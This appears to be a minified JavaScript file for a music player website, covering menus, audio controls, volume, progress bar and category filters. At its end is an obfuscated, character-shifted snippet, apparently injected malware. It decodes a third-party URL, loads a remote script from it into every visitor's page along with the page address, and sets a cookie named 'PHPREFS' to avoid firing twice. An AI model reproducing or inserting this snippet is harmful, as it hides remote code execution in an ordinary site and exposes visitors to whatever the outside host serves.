window.addEventListener("load", () => {
  document.querySelector(".preload").classList.add("preload-finish");
});
const menuBtn = document.querySelector(".menu"),
  mobileNav = document.querySelector(".mobile-nav"),
  links = document.querySelectorAll(".mobile-nav-link");
menuBtn.addEventListener("click", () => {
  mobileNav.classList.toggle("mobile-nav-open"),
    links.forEach((link, index) => {
      link.style.animation
        ? (link.style.animation = "")
        : (link.style.animation = `fade .5s ease forwards ${index / 7 + 0.5}s`);
    }),
    menuBtn.classList.toggle("toggle");
});
const linkColor = document.querySelectorAll(".nav-link");
function colorLink() {
  linkColor.forEach((l) => l.classList.remove("active")),
    this.classList.add("active");
}
linkColor.forEach((l) => l.addEventListener("click", colorLink));
const mobileLink = document.querySelectorAll(".mobile-nav-link");
function colorMobileLink() {
  mobileLink.forEach((l) => l.classList.remove("mobile-active")),
    this.classList.add("mobile-active");
}
mobileLink.forEach((l) => l.addEventListener("click", colorMobileLink));
const BmobileLink = document.querySelectorAll(".mobile-b-icon");
function activeLink() {
  BmobileLink.forEach((l) => l.classList.remove("mobile-b-active")),
    this.classList.add("mobile-b-active");
}
BmobileLink.forEach((l) => l.addEventListener("click", activeLink));
const selected = document.querySelector(".selected"),
  optionsContainer = document.querySelector(".options-container"),
  optionsList = document.querySelectorAll(".option");
selected.addEventListener("click", () => {
  optionsContainer.classList.toggle("active");
}),
  optionsList.forEach((o) => {
    o.addEventListener("click", () => {
      (selected.innerHTML = o.querySelector("label").innerHTML),
        optionsContainer.classList.remove("active");
    });
  });
const app = () => {
  const song = document.querySelector(".song"),
    playBtn = document.getElementById("play"),
    musicContainer = document.getElementById("music-container"),
    sounds = document.querySelectorAll(".music-img");
  function playSong() {
    musicContainer.classList.add("play"), song.play();
  }
  playBtn.addEventListener("click", () => {
    musicContainer.classList.contains("play")
      ? (function pauseSong() {
          musicContainer.classList.remove("play"), song.pause();
        })()
      : playSong();
  }),
    sounds.forEach((sound) => {
      sound.addEventListener("click", function () {
        (song.src = this.getAttribute("data-sound")), playSong();
      });
    });
};
app();
const musicContainer = document.getElementById("music-container"),
  playBtn = document.getElementById("play"),
  pauseBtn = document.querySelector(".pause"),
  audio = document.querySelector(".song"),
  progress = document.getElementById("progress"),
  progressContainer = document.getElementById("progress-container");
function updateProgress(e) {
  const { duration: duration, currentTime: currentTime } = e.srcElement,
    progressPercent = (currentTime / duration) * 100;
  progress.style.width = `${progressPercent}%`;
}
const volumeContainer = document.querySelector(".volume-container"),
  muteBtn = document.getElementById("volume_icon");
let replayBtn = document.querySelector(".replayBtn"),
  volumeSlider = document.getElementById("volume");
const volume_value_el = document.getElementById("volume_show"),
  changeBgTo = (color) => (volumeSlider.style.background = color);
function pauseSong() {
  musicContainer.classList.remove("play"), audio.pause();
}
function muteToggle(audio) {
  !1 === audio.muted ? (audio.muted = !0) : (audio.muted = !1);
}
function volume_change() {
  audio.volume = volumeSlider.value / 100;
}
function updateProgress(e) {
  const { duration: duration, currentTime: currentTime } = e.srcElement,
    progressPercent = (currentTime / duration) * 100;
  progress.style.width = `${progressPercent}%`;
}
function setProgress(e) {
  const width = this.clientWidth,
    clickX = e.offsetX,
    duration = audio.duration;
  audio.currentTime = (clickX / width) * duration;
}
function replay() {
  musicContainer.classList.add("replay"), (audio.loop = !0);
}
function norep() {
  musicContainer.classList.remove("replay"), (audio.loop = !1);
}
volumeSlider.addEventListener("input", () => {
  const value = volumeSlider.value;
  changeBgTo(
    value <= 15
      ? "#A333C8 "
      : value > 15 && value <= 30
      ? "#2185D0"
      : value > 30 && value <= 50
      ? "#6435C9"
      : value > 50 && value <= 65
      ? "#21BA45"
      : value > 65 && value <= 80
      ? "#FBBD08"
      : "#DB2828"
  ),
    (volume_value_el.innerText = value),
    (volume_value_el.style.opacity = 1),
    (volumeSlider.style.boxShadow = "0 5px 15px rgba(255,255,255,0.15)");
}),
  pauseBtn.addEventListener("click", () => {
    pauseSong();
  }),
  muteBtn.addEventListener("click", function () {
    !1 === audio.muted
      ? (volumeContainer.querySelector("i.fa").classList.remove("fa-volume-up"),
        volumeContainer.querySelector("i.fa").classList.add("fa-volume-mute"))
      : (volumeContainer.querySelector("i.fa").classList.add("fa-volume-up"),
        volumeContainer
          .querySelector("i.fa")
          .classList.remove("fa-volume-mute")),
      muteToggle(audio);
  }),
  replayBtn.addEventListener("click", () => {
    musicContainer.classList.contains("replay") ? norep() : replay();
  }),
  volume.addEventListener("change", () => {
    volume_change();
  }),
  audio.addEventListener("timeupdate", updateProgress),
  progressContainer.addEventListener("click", setProgress);
const filterItem = document.querySelector(".category-container"),
  filterImg = document.querySelectorAll(".music-content");
(filterItem.onclick = (selectedItem) => {
  if (selectedItem.target.classList.contains("music-category")) {
    let filterName = selectedItem.target.getAttribute("data-name");
    filterImg.forEach((musicContent) => {
      musicContent.getAttribute("data-name") == filterName ||
      "all" == filterName
        ? (musicContent.classList.remove("hide"),
          musicContent.classList.add("show"))
        : (musicContent.classList.add("hide"),
          musicContent.classList.remove("show"));
    });
  }
}),
  document.addEventListener("DOMContentLoaded", () => {
    const filterContainer = document.querySelector(".filter-button-container"),
      filterCard = document.querySelectorAll(".music-mobile-content");
    filterContainer.onclick = (selectedBtns) => {
      if (selectedBtns.target.classList.contains("filter-item")) {
        let selectedName = selectedBtns.target.getAttribute("data-name");
        filterCard.forEach((cardContent) => {
          cardContent.getAttribute("data-name") == selectedName ||
          "all" == selectedName
            ? (cardContent.classList.remove("hide"),
              cardContent.classList.add("show"))
            : (cardContent.classList.add("hide"),
              cardContent.classList.remove("show"));
        });
      }
    };
  });
const slider = document.querySelector(".filter-button-container");
let startX,
  scrollLeft,
  isDown = !1;
slider.addEventListener("mousedown", (e) => {
  (isDown = !0),
    (startX = e.pageX - slider.offsetLeft),
    (scrollLeft = slider.scrollLeft);
}),
  slider.addEventListener("mouseleave", () => {
    isDown = !1;
  }),
  slider.addEventListener("mouseup", () => {
    isDown = !1;
  }),
  slider.addEventListener("mousemove", (e) => {
    if (!isDown) return;
    e.preventDefault();
    const walk = 3 * (e.pageX - slider.offsetLeft - startX);
    slider.scrollLeft = scrollLeft - walk;
  });
const filterBtnActive = document.querySelectorAll(".filter-button");
function filterAct() {
  filterBtnActive.forEach((l) => l.classList.remove("filter-button-active")),
    this.classList.add("filter-button-active");
}
filterBtnActive.forEach((l) => l.addEventListener("click", filterAct));
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
